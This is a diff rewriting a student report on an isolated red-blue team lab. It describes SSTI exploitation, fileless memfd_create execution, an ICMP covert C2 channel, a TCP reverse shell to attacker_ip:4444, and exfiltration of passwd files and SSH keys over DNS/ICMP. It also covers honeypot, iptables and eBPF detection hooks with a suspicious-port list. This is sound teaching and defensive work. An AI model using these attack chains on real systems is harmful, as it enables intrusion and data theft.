@@ -24,44 +24,33 @@
 
 ### 1.1 Project Motivation
 
-The cybersecurity threat landscape has evolved significantly in recent years. According to the IBM Cost of a Data Breach Report 2024, the average cost of a data breach reached USD 4.88 million globally, with stolen credentials and phishing remaining the most prevalent initial attack vectors [1]. Meanwhile, advanced persistent threat (APT) groups routinely employ covert communication channels — such as ICMP tunneling and DNS exfiltration — to maintain command-and-control (C2) access while bypassing network-level security controls. Research has demonstrated that ICMP's lack of port-based multiplexing makes its data payload field exploitable for covert channels [2], and the MITRE ATT&CK framework documents real-world implementations of ICMP-based C2 by groups deploying tools such as PingPull, Regin, and Cobalt Strike [4].
+Most network security courses teach attacks and defenses separately -- students learn about vulnerability categories, study defense checklists, and maybe run a few Wireshark captures. But real-world security is adversarial and iterative: attackers adapt when they get blocked, defenders upgrade when they get bypassed, and this back-and-forth never really stops. That gap between textbook knowledge and practical experience is what this project tries to address.
 
-Despite the growing sophistication of real-world attacks, traditional cybersecurity education often remains theoretical, focusing on vulnerability taxonomies and defense checklists rather than providing students with hands-on experience in both offensive and defensive operations. This gap between classroom knowledge and practical capability motivates the development of a controlled, reproducible attack-defense laboratory environment where students can experience the full lifecycle of a cyberattack — from reconnaissance through exploitation to data exfiltration — and simultaneously implement, test, and iteratively improve defensive countermeasures.
-
-This project is further motivated by the observation that attack and defense are not static — they constitute an ongoing adversarial process. A defense mechanism that blocks one attack vector may be circumvented by an attacker who adapts their techniques. By structuring the exercise as a multi-round engagement where both sides escalate their capabilities, students gain an appreciation for the iterative nature of real-world cybersecurity operations.
+The specific attack surface we focus on is covert C2 channels, particularly ICMP tunneling. ICMP is a good case study because most firewalls let it through (blocking it breaks ping and traceroute), and its data payload field is essentially unmonitored in most environments [2]. Real APT groups already exploit this -- MITRE ATT&CK documents ICMP-based C2 in tools like PingPull, Regin, and Cobalt Strike [4]. On the defense side, we use eBPF to do kernel-level behavioral detection, which is interesting because it can catch malicious activity regardless of how well the attacker encrypts their traffic.
 
 ### 1.2 Project Objectives
 
-This project aims to design and implement a comprehensive red-blue team attack-defense exercise that achieves the following objectives:
+The goal is to build a controlled red-blue team exercise where both sides escalate over multiple rounds. Specifically, we want to:
 
-1. **Demonstrate a complete Cyber Kill Chain**: Implement a full attack lifecycle spanning reconnaissance, weaponization, delivery, exploitation, installation, and command-and-control, mapped to the MITRE ATT&CK framework.
-
-2. **Implement multi-layered defense-in-depth**: Deploy defensive mechanisms at both the network layer (honeypot deception and firewall-based IP blocking) and the kernel layer (eBPF-based syscall monitoring and real-time process termination) to illustrate the principle that no single defense is sufficient.
-
-3. **Showcase adversarial escalation**: Structure the exercise as a 7-round engagement where the red team and blue team iteratively adapt — the red team develops evasion techniques when blocked, and the blue team upgrades detection capabilities in response.
-
-4. **Apply industry-standard encryption**: Upgrade covert channel encryption from a pedagogical XOR cipher to AES-256-CTR using OpenSSL via ctypes, demonstrating that behavior-based detection remains effective regardless of payload encryption strength.
-
-5. **Provide real-time operational visibility**: Implement a Security Operations Center (SOC) dashboard that aggregates events from all defensive components, providing the unified situational awareness that is central to modern security operations.
-
-6. **Maintain safety and reproducibility**: Ensure all exercises operate within isolated environments with controlled blast radius — no privilege escalation, no destructive operations, and all artifacts are memory-resident or ephemeral.
+1. Implement a realistic attack chain covering reconnaissance through C2, mapped to the MITRE ATT&CK framework and the Cyber Kill Chain model.
+2. Build a defense-in-depth setup with two layers -- network-level deception (honeypot + firewall blocking) and kernel-level behavioral detection (eBPF syscall monitoring with real-time process termination).
+3. Structure the exercise as a 7-round engagement where the red team develops evasion techniques and the blue team upgrades detection in response, so students can see how this adversarial cycle actually plays out.
+4. Tie everything together with a SOC dashboard that gives the blue team a unified view of what is happening across all defensive components.
 
 ### 1.3 Operational Principles
 
-The project adheres to the following operational principles throughout its design and execution:
+All attack and defense activities run in an isolated lab environment against a purpose-built vulnerable service -- nothing touches production systems. The red team has explicit scope constraints: no privilege escalation, no destructive operations.
 
-**Controlled Environment**: All attack and defense activities take place within an isolated laboratory network. The target application is a purpose-built vulnerable service; no production systems are affected. The red team operates under explicit scope constraints — privilege escalation and destructive impact techniques are deliberately excluded to maintain a controlled blast radius.
-
-**Defense-in-Depth Architecture**: The blue team deploys a two-layer defense architecture:
+The blue team deploys two defense layers:
 
 | Layer | Mechanism | Scope | Limitation |
 |-------|-----------|-------|------------|
 | Network Layer | Honeypot + iptables auto-block | Blocks known malicious IPs | Attacker can change IP to bypass |
 | Kernel Layer | eBPF syscall hooks + bpf_send_signal | Blocks malicious behavior regardless of source IP | Must know which syscalls to monitor |
 
-This architecture demonstrates that each layer has inherent limitations, and only their combination provides robust protection.
+Each layer has blind spots on its own, which is the whole point of combining them.
 
-**Iterative Adversarial Engagement**: The demonstration is structured as a 7-round engagement to illustrate that cybersecurity is a continuous process, not a one-time deployment:
+The demo is structured as a 7-round engagement:
 
 | Round | Actor | Action | Outcome |
 |-------|-------|--------|---------|
@@ -74,7 +63,7 @@ This architecture demonstrates that each layer has inherent limitations, and onl
 | 5 | Red | TCP reverse shell (evasion) | Bypasses eBPF v1 |
 | 6 | Blue | eBPF v2 deployed | Reverse shell detected and killed |
 
-**Reproducibility and Documentation**: Every attack and defense step is documented with exact commands, expected outputs, and technical explanations. The project includes a complete demo flow script (`docs/DEMO_FLOW.md`) that enables any team member to reproduce the full exercise independently.
+Every step is documented with exact commands and expected outputs in `docs/DEMO_FLOW.md` so any team member can reproduce the full exercise.
 
 ---
 
@@ -82,9 +71,9 @@ This architecture demonstrates that each layer has inherent limitations, and onl
 
 ### 2.1 The Cyber Kill Chain
 
-The Lockheed Martin Cyber Kill Chain, introduced by Hutchins, Cloppert, and Amin in 2011, provides a systematic framework for understanding the stages of a cyberattack [3]. The model identifies seven sequential phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control (C2), and Actions on Objectives.
+The Lockheed Martin Cyber Kill Chain [3] breaks down a cyberattack into seven sequential phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control (C2), and Actions on Objectives.
 
-This project implements six of the seven phases (excluding Actions on Objectives for safety), with each phase mapped to specific tools and techniques:
+We implement six of the seven phases (excluding Actions on Objectives for safety reasons):
 
 ```
 Phase 1        Phase 2           Phase 3        Phase 4          Phase 5       Phase 6
@@ -95,7 +84,7 @@ nmap         memfd_create       SSTI POST      fork+execve      in-memory     IC
 
 ### 2.2 MITRE ATT&CK Framework
 
-The MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) framework is a globally recognized knowledge base of adversary behavior based on real-world observations [4]. This project maps all implemented techniques to their corresponding ATT&CK identifiers:
+MITRE ATT&CK is a knowledge base of adversary behavior based on real-world observations [4]. We map all our implemented techniques to ATT&CK identifiers:
 
 | Tactic | Technique ID | Technique Name | Implementation |
 |--------|-------------|----------------|----------------|
@@ -110,32 +99,28 @@ The MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) framewo
 
 ### 2.3 Extended Berkeley Packet Filter (eBPF)
 
-eBPF is a revolutionary technology in the Linux kernel that allows sandboxed programs to run in kernel space without modifying kernel source code or loading kernel modules [5]. Originally designed for packet filtering, eBPF has evolved into a general-purpose in-kernel virtual machine with applications in networking, observability, and security.
+eBPF allows sandboxed programs to run in Linux kernel space without modifying kernel source code or loading kernel modules [5]. Originally designed for packet filtering, it has since become a general-purpose in-kernel virtual machine used for networking, observability, and security.
 
-Key properties that make eBPF ideal for security monitoring include:
+What makes eBPF useful for our defense layer:
 
-- **Kernel-space execution**: eBPF programs run in the kernel, providing visibility into all syscalls with zero context-switch overhead. This makes them impossible to evade from userspace.
-- **Safety guarantees**: The eBPF verifier statically analyzes every program before loading, ensuring no unbounded loops, out-of-bounds memory access, or kernel crashes.
-- **Active response capability**: Since Linux 5.3, the `bpf_send_signal()` helper allows eBPF programs to send arbitrary signals (including SIGKILL) to the current process directly from kernel space, enabling real-time threat termination without userspace round-trips [6].
-- **Tracepoint hooks**: eBPF programs can attach to static tracepoints at syscall entry points (`sys_enter_*`), firing before the syscall handler executes. This enables preemptive detection — the malicious operation can be blocked before it completes.
+- **Kernel-space execution**: eBPF programs see all syscalls with zero context-switch overhead, and userspace processes cannot evade them.
+- **Safety guarantees**: The eBPF verifier checks every program before loading -- no unbounded loops, no out-of-bounds access, no kernel crashes.
+- **Active response**: Since Linux 5.3, `bpf_send_signal()` lets eBPF programs send SIGKILL directly from kernel space, so we can terminate a malicious process without a userspace round-trip [6].
+- **Tracepoint hooks**: We attach to syscall entry points (`sys_enter_*`), which fire before the syscall handler runs. This means we can detect and block operations before they complete.
 
-This project attaches eBPF programs to six tracepoints: `sys_enter_memfd_create`, `sys_enter_execve`, `sys_enter_socket`, `sys_enter_connect`, `sys_enter_dup2`, and `sys_enter_dup3`.
+In this project, we hook six tracepoints: `sys_enter_memfd_create`, `sys_enter_execve`, `sys_enter_socket`, `sys_enter_connect`, `sys_enter_dup2`, and `sys_enter_dup3`.
 
 ### 2.4 Cyber Deception and Honeypots
 
-Cyber deception is a proactive defense strategy that uses decoy systems to detect, deflect, and analyze adversary behavior [7]. A honeypot is a security resource whose value lies in being probed, attacked, or compromised — any interaction with a honeypot is inherently suspicious because legitimate users have no reason to access it.
+Cyber deception uses decoy systems to detect and analyze adversary behavior [7]. A honeypot is a security resource that has no legitimate purpose -- any interaction with it is inherently suspicious.
 
-This project deploys a low-interaction honeypot that emulates an SSH server on port 2222. When an attacker connects (typically during the reconnaissance phase), the honeypot logs the source IP and triggers automated firewall blocking via iptables. This approach provides zero false-positive detection — every connection to the honeypot is, by definition, unauthorized.
+We deploy a low-interaction honeypot emulating an SSH server on port 2222. When an attacker connects during reconnaissance, the honeypot logs the source IP and triggers automated firewall blocking via iptables. Since no legitimate user has any reason to connect to this service, every connection is unauthorized by definition, which means zero false positives.
 
 ### 2.5 AES-256-CTR Encryption via OpenSSL
 
-The Advanced Encryption Standard (AES) in Counter (CTR) mode is a symmetric encryption scheme standardized by NIST [8]. AES-256-CTR operates as a stream cipher: it generates a pseudorandom keystream by encrypting successive counter values with AES-256, then XORs the keystream with the plaintext. Key properties include:
+AES in Counter (CTR) mode is a NIST-standardized symmetric encryption scheme [8]. AES-256-CTR works as a stream cipher: it encrypts successive counter values with AES-256 to produce a keystream, then XORs that keystream with the plaintext.
 
-- **IND-CPA security**: With a random initialization vector (IV) per message, identical plaintexts produce different ciphertexts, preventing pattern analysis.
-- **No padding required**: CTR mode produces ciphertext of the same length as the plaintext, making it ideal for network protocols with size constraints.
-- **Parallelizable**: Counter blocks are independent, allowing hardware-accelerated encryption.
-
-This project accesses the AES-256-CTR implementation in OpenSSL's libcrypto via Python's ctypes foreign function interface, avoiding the need for any pip-installed cryptographic packages while still achieving industry-standard encryption strength.
+We use CTR mode for the C2 channel because it does not require padding (ciphertext is the same length as plaintext, which matters for ICMP payloads with size constraints), and with a random IV per message, identical plaintexts produce different ciphertexts. The implementation calls OpenSSL's libcrypto through Python ctypes, so we get real encryption without needing any pip-installed packages.
 
 ---
 
@@ -143,7 +128,7 @@ This project accesses the AES-256-CTR implementation in OpenSSL's libcrypto via 
 
 ### 3.1 Server-Side Template Injection (SSTI)
 
-**Problem**: The target application (`target_app.py`) is a Flask web application that uses Python f-string interpolation to embed user input directly into a Jinja2 template before rendering. This constitutes a Server-Side Template Injection vulnerability (CWE-1336) [9].
+**Problem**: The target application (`target_app.py`) is a Flask web app that uses Python f-string interpolation to embed user input directly into a Jinja2 template before rendering. This is a textbook Server-Side Template Injection vulnerability (CWE-1336) [9].
 
 **Mechanism**: When a user submits a diagnostic query, the application constructs the template as:
 
@@ -162,22 +147,22 @@ If `user_input` contains Jinja2 expression delimiters (`{{ }}`), the template en
 
 ### 3.2 Fileless Malware via memfd_create
 
-**Problem**: Traditional malware detection relies on scanning files on disk. The `memfd_create` syscall (Linux 3.17+, syscall 319 on x86_64) creates anonymous files that exist entirely in RAM with no filesystem entry, enabling fileless execution that evades file-based detection [10].
+**Problem**: Traditional malware detection relies on scanning files on disk. The `memfd_create` syscall (Linux 3.17+, syscall 319 on x86_64) creates anonymous files that exist entirely in RAM with no filesystem entry, which means file-based detection tools never see them [10].
 
-**Mechanism**: The attack chain proceeds as:
+**Mechanism**: The attack chain is:
 
-1. `memfd_create("", 0)` — creates an anonymous file descriptor in kernel tmpfs
-2. `write(fd, agent_code)` — writes the C2 agent into the anonymous fd
-3. `fork()` — parent returns to allow the web server to respond
-4. `execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])` — child executes the agent from the anonymous fd
+1. `memfd_create("", 0)` -- creates an anonymous file descriptor in kernel tmpfs
+2. `write(fd, agent_code)` -- writes the C2 agent into the anonymous fd
+3. `fork()` -- parent returns to let the web server respond normally
+4. `execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])` -- child executes the agent from the anonymous fd
 
-The resulting process runs entirely from memory. The agent binary never touches the filesystem, leaving no artifacts for forensic analysis or on-access antivirus scanning.
+The resulting process runs entirely from memory. The agent binary never touches the filesystem, leaving no artifacts for forensic analysis or antivirus scanning.
 
 ### 3.3 ICMP Covert Command and Control Channel
 
-**Problem**: Traditional C2 channels over TCP/UDP are monitored by firewalls and IDS/IPS systems. ICMP (Internet Control Message Protocol, RFC 792) is often permitted through firewalls because blocking it disrupts essential network diagnostics (ping, traceroute) [11].
+**Problem**: TCP/UDP-based C2 channels are monitored by firewalls and IDS/IPS. ICMP (RFC 792) is usually allowed through because blocking it breaks basic network diagnostics [11].
 
-**Mechanism**: The C2 channel embeds encrypted command and response data in the payload field of ICMP echo request (type 8) packets. The protocol uses:
+**Mechanism**: The C2 channel embeds encrypted commands and responses in the payload field of ICMP echo request (type 8) packets:
 
 - **ICMP ID field (0x1337)** as a traffic discriminator
 - **Magic byte (0xDE)** for quick payload validation
@@ -188,23 +173,23 @@ Both the C2 server and agent send ICMP type 8 packets; kernel-generated auto-rep
 
 ### 3.4 TCP Reverse Shell (eBPF Evasion)
 
-**Problem**: When the blue team deploys eBPF-based detection that monitors `memfd_create`, `execve` from `/proc/fd`, and raw ICMP sockets, the attacker must adapt. A standard TCP reverse shell uses none of these monitored syscalls.
+**Problem**: When the blue team deploys eBPF-based detection that monitors `memfd_create`, `execve` from `/proc/fd`, and raw ICMP sockets, the attacker needs to find a way around it. A standard TCP reverse shell avoids all three of those monitored syscall patterns.
 
-**Mechanism**: The evasion technique replaces the fileless ICMP C2 with a conventional reverse shell:
+**Mechanism**: The evasion replaces the fileless ICMP C2 with a conventional reverse shell:
 
-1. `fork()` — background the shell process
-2. `socket(AF_INET, SOCK_STREAM, 0)` — create a regular TCP socket (not SOCK_RAW)
-3. `connect(attacker_ip, 4444)` — outbound TCP connection
-4. `dup2(sock_fd, 0/1/2)` — redirect stdin, stdout, stderr to the socket
-5. `pty.spawn("/bin/bash")` — spawn an interactive shell
+1. `fork()` -- background the shell process
+2. `socket(AF_INET, SOCK_STREAM, 0)` -- regular TCP socket (not SOCK_RAW)
+3. `connect(attacker_ip, 4444)` -- outbound TCP connection
+4. `dup2(sock_fd, 0/1/2)` -- redirect stdin, stdout, stderr to the socket
+5. `pty.spawn("/bin/bash")` -- spawn an interactive shell
 
-This bypasses all three eBPF v1 hooks because it uses standard TCP (not raw ICMP), does not call `memfd_create`, and does not execute from `/proc/fd`.
+This bypasses all three eBPF v1 hooks: it uses standard TCP (not raw ICMP), never calls `memfd_create`, and does not execute from `/proc/fd`.
 
 ### 3.5 DNS/ICMP Data Exfiltration
 
-**Problem**: After establishing access, an attacker may seek to exfiltrate sensitive data. Traditional data transfer methods (HTTP, FTP, SCP) are typically monitored. DNS and ICMP channels are often overlooked.
+**Problem**: After establishing access, an attacker may want to exfiltrate data. HTTP, FTP, and SCP are typically monitored, but DNS and ICMP channels often are not.
 
-**Mechanism**: The exfiltration agent collects sensitive files (`/etc/passwd`, SSH keys, bash history, application source code) and transmits them through:
+**Mechanism**: The exfiltration agent collects sensitive files (`/etc/passwd`, SSH keys, bash history, application source code) and sends them out through:
 
 - **DNS channel**: Data is Base32-encoded and embedded as subdomain labels in DNS queries to a controlled domain (`<data>.x.exfil.local`). A fake DNS server on the attacker side reassembles the fragments.
 - **ICMP channel**: Data is hex-encoded and embedded in the padding pattern of ICMP echo requests via the `ping -p` option.
@@ -215,57 +200,57 @@ Both channels use chunked transfer with sequence numbers, checksums for integrit
 
 ## 4. The Proposed Solutions
 
-### 4.1 Layer 1: Cyber Deception — Honeypot and Network MDR
+### 4.1 Layer 1: Cyber Deception -- Honeypot and Network MDR
 
-**Component 1 — Honeypot (`target/honeypot.py`)**:
+**Component 1 -- Honeypot (`target/honeypot.py`)**:
 
 A low-interaction SSH honeypot listens on port 2222, presenting a realistic OpenSSH 8.9p1 banner that fools service detection tools (e.g., nmap `-sV`). Any connection is logged to `trap.log` with timestamp, source IP, port, and client data.
 
-**Component 2 — Network MDR (`blue_team/blue_mdr_network.py`)**:
+**Component 2 -- Network MDR (`blue_team/blue_mdr_network.py`)**:
 
-A monitoring daemon polls `trap.log` for new attacker IP entries. Upon detection, it immediately executes:
+A monitoring daemon polls `trap.log` for new attacker IP entries. Upon detection, it executes:
 
 ```
 iptables -I INPUT 1 -s <attacker_ip> -j DROP
 ```
 
-The rule is inserted at position 1 (highest priority) in the INPUT chain, ensuring it takes precedence over any existing ACCEPT rules. This blocks the attacker from reaching any service on the machine.
+The rule is inserted at position 1 (highest priority) in the INPUT chain, so it takes precedence over any existing ACCEPT rules. This blocks the attacker from reaching any service on the machine.
 
-**Effectiveness**: Zero false-positive detection — any connection to the honeypot is unauthorized by definition.
+**Effectiveness**: Zero false positives -- any connection to the honeypot is unauthorized by definition.
 
-**Limitation**: IP-based blocking can be circumvented by changing the source IP (e.g., via IP aliasing). This limitation motivates the need for Layer 2 (behavior-based detection).
+**Limitation**: IP-based blocking is easily circumvented by changing the source IP (e.g., via IP aliasing). This is why we need Layer 2.
 
-### 4.2 Layer 2: Kernel-Level Detection — eBPF MDR
+### 4.2 Layer 2: Kernel-Level Detection -- eBPF MDR
 
-**Component 3 — eBPF MDR v1 (`blue_team/blue_ebpf_mdr.py`)**:
+**Component 3 -- eBPF MDR v1 (`blue_team/blue_ebpf_mdr.py`)**:
 
 Three eBPF tracepoint hooks detect fileless malware:
 
 | Hook | Tracepoint | Detection Logic |
 |------|-----------|-----------------|
 | Hook 1 | `sys_enter_memfd_create` | Any call to memfd_create on a server is suspicious; PID recorded for correlation |
-| Hook 2 | `sys_enter_execve` | Pattern-match filename for `/proc/<pid>/fd/` — indicates execution from anonymous memory |
+| Hook 2 | `sys_enter_execve` | Pattern-match filename for `/proc/<pid>/fd/` -- indicates execution from anonymous memory |
 | Hook 3 | `sys_enter_socket` | Detect `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)`; correlate with memfd PID for high-confidence C2 detection |
 
-When `--kill` mode is enabled, `bpf_send_signal(SIGKILL)` terminates the malicious process from kernel space before the syscall completes. Additionally, a cold-start scanner checks `/proc/*/exe` for existing `memfd:` processes at startup.
+When `--kill` mode is enabled, `bpf_send_signal(SIGKILL)` terminates the malicious process from kernel space before the syscall completes. A cold-start scanner also checks `/proc/*/exe` for existing `memfd:` processes at startup.
 
-**Component 4 — eBPF MDR v2 (`blue_team/blue_ebpf_mdr_v2.py`)**:
+**Component 4 -- eBPF MDR v2 (`blue_team/blue_ebpf_mdr_v2.py`)**:
 
-Retains all v1 hooks and adds three new hooks to detect reverse shells:
+Keeps all v1 hooks and adds three new ones to detect reverse shells:
 
 | Hook | Tracepoint | Detection Logic |
 |------|-----------|-----------------|
 | Hook 4 | `sys_enter_connect` | Check destination port against a configurable suspicious-ports list (default: 4444, 4445, 5555, 1234, 1337) |
-| Hook 5 | `sys_enter_dup2` | Track per-PID bitmask; when fd 0, 1, and 2 are all redirected → reverse shell confirmed |
+| Hook 5 | `sys_enter_dup2` | Track per-PID bitmask; when fd 0, 1, and 2 are all redirected, that confirms a reverse shell |
 | Hook 6 | `sys_enter_dup3` | Same as Hook 5, covering Python's `os.dup2(fd, fd2, inheritable=False)` code path |
 
-The `connect` hook provides fast detection at connection time (port-based), while the `dup2/dup3` hooks provide port-agnostic detection based on the behavioral signature of reverse shells.
+The `connect` hook gives fast port-based detection at connection time, while the `dup2/dup3` hooks provide port-agnostic detection based on the behavioral signature of fd redirection.
 
-### 4.3 Real-Time Operational Visibility — SOC Dashboard
+### 4.3 Real-Time Operational Visibility -- SOC Dashboard
 
-**Component 5 — SOC Dashboard (`blue_team/soc_dashboard.py`)**:
+**Component 5 -- SOC Dashboard (`blue_team/soc_dashboard.py`)**:
 
-A Flask-based web application (port 8080) aggregates events from all defensive components and displays them in a real-time dark-themed SOC console. Features include:
+A Flask-based web application (port 8080) that aggregates events from all defensive components into a real-time dark-themed console. Features include:
 
 - **Server-Sent Events (SSE)** for real-time streaming to the browser
 - **Multi-source ingestion**: reads `trap.log` (honeypot events) and `soc_events.jsonl` (eBPF alerts, iptables blocks)
@@ -273,9 +258,9 @@ A Flask-based web application (port 8080) aggregates events from all defensive c
 - **Statistics cards**: total events, blocked IPs, process kills, critical alerts
 - **Color-coded severity**: CRITICAL (red), HIGH (yellow), MEDIUM (blue), INFO (gray)
 
-Blue team tools write to `soc_events.jsonl` via the `--soc-log` flag, enabling the dashboard to display eBPF detections and network blocks alongside honeypot events.
+Blue team tools write to `soc_events.jsonl` via the `--soc-log` flag, so the dashboard shows eBPF detections and network blocks alongside honeypot events.
 
-### 4.4 Encryption Upgrade — AES-256-CTR
+### 4.4 Encryption Upgrade -- AES-256-CTR
 
 The covert C2 channel encryption was upgraded from XOR to AES-256-CTR:
 
@@ -288,7 +273,7 @@ The covert C2 channel encryption was upgraded from XOR to AES-256-CTR:
 | Implementation | Pure Python | ctypes + OpenSSL libcrypto |
 | Dependencies | None | System libcrypto (pre-installed on Linux) |
 
-The upgrade demonstrates two important points: (1) real-world malware increasingly uses strong cryptography, and (2) behavior-based detection (eBPF) remains effective regardless of encryption strength because it detects malicious syscall patterns, not payload content.
+This upgrade illustrates two things: first, real-world malware increasingly uses strong cryptography, and second, behavior-based detection (eBPF) still works regardless of encryption strength because it monitors syscall patterns, not payload content.
 
 ### 4.5 Defense-in-Depth Summary
 
@@ -313,19 +298,15 @@ The upgrade demonstrates two important points: (1) real-world malware increasing
 
 ## 5. Conclusion
 
-This project demonstrates that effective cybersecurity requires a layered, adaptive approach. Through a 7-round red-blue team engagement, we illustrate several key insights:
+This project demonstrates that no single defense layer is enough on its own. Network-layer defenses like honeypots and firewalls get bypassed as soon as the attacker changes their IP. Kernel-layer detection (eBPF v1) works until the attacker switches to a different set of syscalls. It is only by stacking multiple independent detection mechanisms that we get something reasonably robust.
 
-**No single defense is sufficient.** Network-layer defenses (honeypots, firewalls) can be bypassed by changing IP addresses. Kernel-layer defenses (eBPF v1) can be bypassed by using different syscall patterns. Only the combination of multiple independent detection mechanisms provides robust protection.
+The 7-round structure makes this concrete. When eBPF v1 killed the fileless ICMP C2 agent, the red team pivoted to a standard TCP reverse shell that did not trigger any of the monitored hooks. The blue team had to deploy eBPF v2 with additional hooks for `connect()` and `dup2()` to catch the new technique. This kind of back-and-forth is what real security operations look like, and it is hard to appreciate from reading about it in a textbook.
 
-**Attackers adapt, so defenders must evolve.** When eBPF v1 blocked the fileless ICMP C2, the red team pivoted to a standard TCP reverse shell that used none of the monitored syscalls. The blue team responded by deploying eBPF v2 with additional hooks for `connect()` and `dup2()`, restoring detection capability. This cycle mirrors real-world security operations.
+The encryption upgrade from XOR to AES-256-CTR is also instructive. Making the C2 traffic unreadable through payload inspection did nothing to stop eBPF detection, because eBPF watches what the process *does* (which syscalls it makes) rather than what the traffic *contains*. This is a useful lesson for understanding why behavioral detection matters.
 
-**Behavior-based detection transcends encryption.** Upgrading the C2 channel from XOR to AES-256-CTR made payload inspection impossible, yet eBPF detection remained fully effective because it monitors syscall behavior — what the process does — rather than what the traffic contains.
+On the visibility side, the SOC dashboard turned out to be more useful than expected for understanding the full attack picture. Without it, the blue team would be looking at isolated log files from different components and trying to mentally piece together what happened.
 
-**Operational visibility is essential.** The SOC dashboard provides unified situational awareness across all defensive components, enabling the blue team to understand the full attack picture rather than responding to isolated alerts.
-
-**Fileless techniques challenge traditional defenses.** By executing entirely in memory via `memfd_create`, the C2 agent leaves no filesystem artifacts for traditional antivirus or forensic tools to detect. This validates the need for kernel-level behavioral monitoring through technologies like eBPF.
-
-The project successfully implements 7 MITRE ATT&CK attack techniques and 7 corresponding detection capabilities across two defense layers, providing students with practical experience in both offensive and defensive cybersecurity operations within a controlled, reproducible environment.
+Overall, the project implements 7 ATT&CK techniques and 7 corresponding detection capabilities across two defense layers, giving us hands-on experience with both offensive and defensive operations in a controlled environment.
 
 ---
 
